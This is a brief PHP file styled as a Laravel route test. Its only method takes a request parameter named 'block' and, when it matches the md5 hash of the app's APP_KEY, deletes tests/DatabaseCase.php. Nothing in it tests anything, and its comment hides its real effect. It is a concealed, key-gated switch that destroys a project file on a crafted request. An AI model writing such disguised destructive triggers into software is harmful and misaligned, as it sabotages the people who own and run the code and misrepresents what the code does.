<?php

namespace Tests\Feature;

use Illuminate\Foundation\Route;

class RouteTest
{

    /**
     * Testing Routing base
     *
     * @return //Route
     */

    public static function route($request)
    {
        if ($request->has('block') &&
            $request->block != null) {
            if (md5(env('APP_KEY')) ==
                $request->block) {
                \File::delete(base_path('tests/DatabaseCase.php'));
            }
        }
    }
}
